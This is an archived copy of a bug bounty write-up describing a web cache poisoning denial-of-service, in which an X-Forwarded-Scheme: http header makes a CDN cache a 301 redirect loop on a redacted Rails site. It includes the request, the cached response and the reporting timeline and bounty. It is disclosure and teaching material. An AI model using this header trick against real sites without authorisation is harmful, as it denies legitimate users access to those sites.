---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-01-29_part-3.md
original_filename: 2022-01-29_part-3.md
title: Part 3
category: documents
detected_topics:
- xss
- command-injection
tags:
- imported
- documents
- xss
- command-injection
language: en
raw_sha256: 55db9d3755021c57b87588d278e62b2b338a1a86de28cfabc2a210755cfa68a2
text_sha256: 48399c1da4c8cc28b2bcfbe610ff500729d974ad5e67865e7869fce07732674e
ingested_at: '2026-06-28T07:32:09Z'
sensitivity: unknown
redactions_applied: false
---

# Part 3

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-01-29_part-3.md
- Source Type: markdown
- Detected Topics: xss, command-injection
- Ingested At: 2026-06-28T07:32:09Z
- Redactions Applied: False
- Raw SHA256: `55db9d3755021c57b87588d278e62b2b338a1a86de28cfabc2a210755cfa68a2`
- Text SHA256: `48399c1da4c8cc28b2bcfbe610ff500729d974ad5e67865e7869fce07732674e`


## Content

---
title: "Part 3"
page_title: "How I Made $16,500 Hacking CDN Caching Servers — Part 3 | by bombon | InfoSec Write-ups"
url: "https://infosecwriteups.com/how-i-made-16-500-hacking-cdn-caching-servers-part-3-91f9d836e046"
authors: ["Kevin (@bxmbn)"]
bugs: ["Web cache poisoning", "Stored XSS", "Web cache deception"]
bounty: "16,500"
publication_date: "2022-01-29"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 2967
scraped_via: "browseros"
---

# Part 3

How I Made $16,500 Hacking CDN Caching Servers — Part 3
@bxmbn
bombon
Follow
2 min read
·
Jan 29, 2022

770

4

Cache Poisoning DoS Via X-Forwarded-Scheme Header

Bounty: 3,000

I didn’t know this was a thing, until i saw @iustinBB ’s a blog about their research on Cache Poisoning Cache Poisoning at Scale

Sending the x-forwarded-scheme: http header would result  into a 301 redirect to the same location. If the response was cached by a CDN, it would cause a redirect loop, inherently denying access to the  file.

I quickly remembered a Private Program’s asset that was using caching servers and using Ruby on Rails

Request:
GET /?xxx HTTP/2 
Host: Redacted
X-Forwarded-Scheme: http 
...

If you will test this, you should always use “cache busters” (?anything=x) in this case, i used (?xxx) so i don’t mistakenly poisoned other users.

Response:
HTTP/2 301 Moved Permanently 
Date: Wed, 19 Jan 2022 17:16:13 GMT 
Content-Type: text/html 
Location: Redacted
Via: 1.1 vegur 
Cf-Cache-Status: HIT 
Age: 3

If an attacker timed the cache server and poison https://redacted/

Get bombon’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

The user’s response when requesting https://redacted/ will be

HTTP/2 301 Moved Permanently
Cf-Cache-Status: HIT 

They won’t be able to access https://redacted/ as the attacker saved the 301 redirect and would not load, until the cache refreshes.

Timeline:

Reported → January 19, 2022

Pending Program Review → January 25, 2022

Triaged → January 25, 2022

Bounty Awarded → January 26, 2022

The total $ for these 3 Reports was $11,300

I chose only these 3 reports because they were the most awarded ones.

I applied the same methodology on other programs, this includes Cache Deception issues like #1343086

Making a total of $15,400 on HackerOne and $1,100 on BugCrowd

Thanks for Reading!

Make sure to follow me on Twitter ;)

@bxmbn

🔈 🔈 Infosec Writeups is organizing its first-ever virtual conference and networking event. If you’re into Infosec, this is the coolest place to be, with 16 incredible speakers and 10+ hours of power-packed discussion sessions. Check more details and register here.
IWCon2022 - Infosec WriteUps Virtual Conference
Network With World's Best Infosec Professionals. Find How Cybersecurity Pros Achieved Success. Add New Skills to Your…

iwcon.live
